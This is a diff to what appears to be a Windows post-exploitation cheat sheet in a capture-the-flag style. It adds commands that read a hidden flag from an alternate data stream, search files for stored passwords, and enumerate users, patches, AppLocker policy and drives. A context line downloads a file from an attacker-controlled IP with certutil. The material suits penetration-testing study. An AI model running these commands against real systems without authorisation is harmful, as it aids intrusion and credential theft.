@@ -9,6 +9,12 @@ certutil.exe -urlcache -split -f http://<ip>/file file_save
 timedatectl set-ntp 0
 
 ntpdate $IP
+
+dir /R
+
+# Alternate Data Streams are commonly used for storing hidden data or metadata
+Get-Content "C:\Users\Administrator\Desktop\hm.txt:root.txt"
+more < hm.txt:root.txt:$DATA
 ```
 
 Get Processes
@@ -43,6 +49,11 @@ $shortcut = $shell.CreateShortcut($shortcutPath)
 $shortcut.TargetPath = $targetPath
 $shortcut.Save()
 ```
+
+### Quick Loot?
+```
+findstr /si password *.txt *.ini *.config
+```
 ### Who Am I?
 ```powershell
 whoami
@@ -65,7 +76,7 @@ echo %hostname%
 ### Anyone home?
 Local users
 ```powershell
-net users
+net user s
 
 Get-ADUser <username> -Properties MemberOf
 ```
@@ -85,8 +96,12 @@ Domain groups
 net groups /domain
 ```
 ### What is this place?
-```text
+```powershell
 systeminfo
+
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+wmic qfe
 ```
 ### Is it fancy?
 Both should be the same for ease of exploitation, if either is 32-bit then try to gain a 64-bit shell.  
@@ -104,6 +119,8 @@ $ExecutionContext.SessionState.LanguageMode
 ```powershell
 Get-AppLockerPolicy -Effective
 Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections
+
+wmic logicaldisk get caption
 ```
 ### What does the inside look like?
 Look for interesting services
